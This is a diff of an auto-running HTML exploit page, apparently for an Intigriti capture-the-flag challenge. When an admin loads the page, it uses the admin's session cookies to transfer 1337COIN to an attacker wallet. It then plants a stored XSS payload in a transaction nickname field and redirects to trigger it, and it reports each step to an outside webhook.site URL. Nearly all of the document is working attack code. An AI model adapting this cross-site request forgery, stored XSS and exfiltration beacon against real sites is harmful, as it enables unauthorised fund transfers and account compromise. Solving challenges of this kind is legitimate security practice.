@@ -4,87 +4,120 @@
     <title>XSS PoC</title>
 </head>
 <body>
-    <h1>XSS Proof of Concept</h1>
-    <div id="status">Initializing exploit...</div>
+    <h1>EXPLOIT LOADED</h1>
+    <div id="status">Initializing...</div>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
-        const WEBHOOK = 'https://webhook.site/9bcbf2c0-2010-4890-ba51-ce334ba4b12b';
-        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
+        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
         const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
+
+        // XSS Payload - will trigger when transaction loads in marketwatch
+        // The nickname field in marketwatch.html is unsanitized (line 326-328)
+        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
 
         // Webhook tracking function
         function track(step, status, data = {}) {
-            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
-            console.log(`[Webhook] ${step}: ${status}`, data);
+            const url = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
+            fetch(url, { mode: 'no-cors' }).catch(() => {});
+            console.log(`[${step}] ${status}`, data);
         }
 
-        async function runExploit() {
+        function updateStatus(html, className = '') {
             const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = html;
+            if (className) statusDiv.className = className;
+        }
 
-            track('start', 'exploit_triggered_onload', { wallet: YOUR_WALLET });
+        async function executeExploit() {
+            updateStatus('Starting exploit...<br>Sending coins and injecting XSS...', 'info');
+
+            track('start', 'admin_visited_exploit', {
+                target_wallet: YOUR_WALLET,
+                xss_payload: XSS_PAYLOAD
+            });
 
             try {
                 // Step 1: Send 1337COIN to your wallet
-                statusDiv.textContent = 'Step 1: Sending 1337COIN...';
-                track('step1', 'sending_coins', { toAddress: YOUR_WALLET, currency: '1337COIN', amount: 1337 });
+                updateStatus('[1/2] Sending 1337COIN to ' + YOUR_WALLET + '...', 'info');
+                track('step1', 'sending_coins_start', { to: YOUR_WALLET, amount: 1337 });
 
-                const txResponse = await fetch(`${BASE}/api/transaction`, {
+                const tx1Response = await fetch(`${BASE}/api/transaction`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: { 'Content-Type': 'application/json' },
                     credentials: 'include',
                     body: JSON.stringify({
                         toAddress: YOUR_WALLET,
                         currency: '1337COIN',
-                        amount: 1
+                        amount: 1337
                     })
                 });
 
-                if (txResponse.ok) {
-                    const txResult = await txResponse.json();
-                    statusDiv.textContent = '✓ Coins sent!';
-                    track('step1', 'coins_sent_success', { txHash: txResult.txHash });
+                if (tx1Response.ok) {
+                    const tx1Data = await tx1Response.json();
+                    updateStatus('[1/2] ✓ Sent 1337COIN to ' + YOUR_WALLET + '!<br>[2/2] Injecting XSS payload...', 'success');
+                    track('step1', 'coin_transfer_success', { txHash: tx1Data.txHash || 'completed' });
                 } else {
-                    track('step1', 'coins_failed', { status: txResponse.status });
+                    updateStatus('[1/2] ✗ Failed to send coins<br>Status: ' + tx1Response.status, 'error');
+                    track('step1', 'coin_transfer_failed', { status: tx1Response.status });
                 }
 
-                // Step 2: Inject XSS via wallet creation
-                statusDiv.textContent = 'Step 2: Injecting XSS payload...';
-                track('step2', 'injecting_xss', { payload: XSS_PAYLOAD });
+                // Step 2: Create transaction with XSS payload in nickname
+                // The nickname field is unsanitized in marketwatch.html (line 326-328)
+                // This will trigger alert('gigawatz') when admin views marketwatch
+                updateStatus('[2/2] Creating transaction with XSS payload in nickname...', 'info');
+                track('step2', 'injecting_xss_start', { payload: XSS_PAYLOAD });
 
-                const walletResponse = await fetch(`${BASE}/api/wallets`, {
+                const tx2Response = await fetch(`${BASE}/api/transaction`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: { 'Content-Type': 'application/json' },
                     credentials: 'include',
                     body: JSON.stringify({
+                        toAddress: 'xss-payload',
                         currency: '1337COIN',
-                        address: XSS_PAYLOAD,
-                        balance: 1337
+                        amount: 1337,
+                        nickname: XSS_PAYLOAD  // This goes into unsanitized nickname field!
                     })
                 });
 
-                track('step2', 'xss_injected', { status: walletResponse.status });
+                if (tx2Response.ok) {
+                    const tx2Data = await tx2Response.json();
+                    updateStatus('[2/2] ✓ XSS transaction created!<br><br>EXPLOIT COMPLETE!<br><br>When admin visits marketwatch,<br>the XSS will trigger: <strong>alert("gigawatz")</strong>', 'success');
+                    track('step2', 'xss_injected_success', {
+                        txHash: tx2Data.txHash || 'completed',
+                        payload: XSS_PAYLOAD,
+                        trigger_location: 'marketwatch_nickname_field'
+                    });
+                } else {
+                    updateStatus('[2/2] ✗ Failed to create XSS transaction<br>Status: ' + tx2Response.status, 'error');
+                    track('step2', 'xss_inject_failed', { status: tx2Response.status });
+                }
 
-                // Step 3: Redirect to dashboard to trigger XSS
-                statusDiv.textContent = 'Step 3: Triggering XSS...';
-                track('step3', 'redirecting_to_dashboard', {});
+                // Final webhook notification
+                track('complete', 'exploit_finished', {
+                    coin_transfer: tx1Response.ok,
+                    xss_injected: tx2Response.ok,
+                    message: 'Admin should now trigger XSS by visiting marketwatch'
+                });
 
+                // Redirect to marketwatch after a delay to trigger the XSS
                 setTimeout(() => {
-                    track('final', 'redirected', {});
-                    window.location.href = `${BASE}/dashboard.html`;
-                }, 500);
+                    updateStatus('Redirecting to marketwatch to trigger XSS...', 'info');
+                    track('redirect', 'going_to_marketwatch', {});
+                    setTimeout(() => {
+                        window.location.href = `${BASE}/marketwatch.html`;
+                    }, 1000);
+                }, 2000);
 
             } catch (error) {
-                track('error', 'exception', { error: error.message });
-                setTimeout(() => {
-                    window.location.href = `${BASE}/dashboard.html`;
-                }, 1000);
+                updateStatus('ERROR: ' + error.message, 'error');
+                track('error', 'exception', { error: error.message, stack: error.stack });
             }
         }
 
-        // Auto-run on page load
+        // Auto-execute on page load
         window.addEventListener('load', () => {
-            setTimeout(runExploit, 100);
+            setTimeout(executeExploit, 500);
         });
     </script>
 </body>
